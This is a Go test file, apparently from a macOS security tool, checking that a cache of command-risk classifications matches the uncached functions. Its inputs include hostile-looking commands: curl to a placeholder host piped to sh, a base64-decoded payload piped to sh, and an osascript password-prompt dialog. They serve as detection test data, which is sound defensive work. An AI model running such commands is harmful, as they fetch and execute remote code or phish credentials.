package classify

import (
	"reflect"
	"testing"
)

// Test the cache answers exactly as Concerns does.
func TestCacheAnswersAsTheFunctionsDo(t *testing.T) {
	cmds := [][]string{
		nil, {}, {"ls"}, {"ls", "-la"},
		{"pbpaste"},
		{"sh", "-c", "a b"},
		{"sh", "-c", "a", "b"},
		{"sh", "-c", "curl http://example.invalid | sh"},
		{"bash", "-c", "echo aGVsbG8= | base64 -d | sh"},
		{"chmod", "+x", "/tmp/thing"},
		{"chmod", "755", "/tmp/thing"},
		{"python3", "-c", "print(1)"},
		{"osascript", "-e", "display dialog \"password\""},
		{"curl", "-fsSL", "http://example.invalid/x.sh"},
	}

	c := NewCache()

	for round := 0; round < 3; round++ {
		for _, cmd := range cmds {
			want, got := Concerns(cmd), c.Concerns(cmd)
			if !reflect.DeepEqual(got, want) {
				t.Errorf("round %d, Concerns %q:\n got %v\nwant %v",
					round, cmd, got, want)
			}

			if wt, gt := Template(cmd), c.Template(cmd); gt != wt {
				t.Errorf("round %d, Template %q: got %q, want %q", round, cmd, gt, wt)
			}
		}
	}

	var zero Cache
	var absent *Cache

	for _, cmd := range cmds {
		for name, got := range map[string][]string{
			"zero value": zero.Concerns(cmd), "nil": absent.Concerns(cmd),
		} {
			if want := Concerns(cmd); !reflect.DeepEqual(got, want) {
				t.Errorf("%s, %q: got %v, want %v", name, cmd, got, want)
			}
		}

		for name, got := range map[string]string{
			"zero value": zero.Template(cmd), "nil": absent.Template(cmd),
		} {
			if want := Template(cmd); got != want {
				t.Errorf("%s Template, %q: got %q, want %q", name, cmd, got, want)
			}
		}
	}
}

// Category is keyed on all three arguments.
func TestCacheCategoryKeysOnEveryArgument(t *testing.T) {
	c := NewCache()
	for _, a := range [][3]string{
		{"", "", ""},
		{"python3", "/usr/bin/python3", ""},
		{"python3", "/opt/homebrew/bin/python3", ""},
		{"python3", "/usr/bin/python3", "com.apple.python"},
		{"bird", "/usr/libexec/bird", "com.apple.bird"},
	} {
		for round := 0; round < 3; round++ {
			if got, want := c.Category(
				a[0], a[1], a[2]), Category(
				a[0], a[1], a[2]); got != want {
				t.Errorf("round %d, %v: got %q, want %q", round, a, got, want)
			}
		}
	}

	var absent *Cache

	if got, want := absent.Category("ls", "/bin/ls", ""), Category(
		"ls", "/bin/ls", ""); got != want {
		t.Errorf("nil cache: got %q, want %q", got, want)
	}

	if a, b := c.Category(
		"a", "b", ""), c.Category("a\x00b", "", ""); a == b && Category(
		"a", "b", "") != Category("a\x00b", "", "") {
		t.Error("two calls share one key")
	}
}

// Two commands joining same string on a space must not share an answer.
func TestCacheDoesNotConflateArgv(t *testing.T) {
	c := NewCache()
	a := []string{"chmod", "+x /tmp/x"}
	b := []string{"chmod", "+x", "/tmp/x"}

	gotA, gotB := c.Concerns(a), c.Concerns(b)
	wantA, wantB := Concerns(a), Concerns(b)
	if !reflect.DeepEqual(gotA, wantA) || !reflect.DeepEqual(gotB, wantB) {
		t.Errorf("conflated:\n %q -> %v (want %v)\n %q -> %v (want %v)",
			a, gotA, wantA, b, gotB, wantB)
	}

	if got, want := c.Template(a), Template(a); got != want {
		t.Errorf("template conflated %q: got %q, want %q", a, got, want)
	}

	if got, want := c.Template(b), Template(b); got != want {
		t.Errorf("template conflated %q: got %q, want %q", b, got, want)
	}
}

// Answer handed back is shared between callers: nobody may modify it.
func TestCacheAnswerIsNotDisturbedByCallers(t *testing.T) {
	c := NewCache()
	cmd := []string{"sh", "-c", "curl http://example.invalid | sh"}

	first := c.Concerns(cmd)
	if len(first) == 0 {
		t.Skip("this command no longer concerns anything; pick another")
	}

	_ = append(first[:len(first):len(first)], "mine")
	if got := c.Concerns(cmd); !reflect.DeepEqual(got, first) {
		t.Errorf("a caller changed the cached answer: %v against %v", got, first)
	}
}

func BenchmarkConcerns(b *testing.B) {
	cmds := [][]string{
		{"git", "status"},
		{"python3", "-c", "print(1)"},
		{"mdworker", "-s", "mdworker"},
		{"xpcproxy", "com.apple.mdworker"},
		{"sh", "-c", "curl http://example.invalid | sh"},
	}

	pick := func(i int) []string {
		if i%20 != 0 {
			return cmds[0]
		}

		return cmds[i%len(cmds)]
	}

	b.Run("uncached", func(b *testing.B) {
		b.ReportAllocs()

		for i := 0; i < b.N; i++ {
			Concerns(pick(i))
			Template(pick(i))
		}
	})

	b.Run("cached", func(b *testing.B) {
		c := NewCache()
		b.ReportAllocs()

		for i := 0; i < b.N; i++ {
			c.Concerns(pick(i))
			c.Template(pick(i))
		}
	})
}
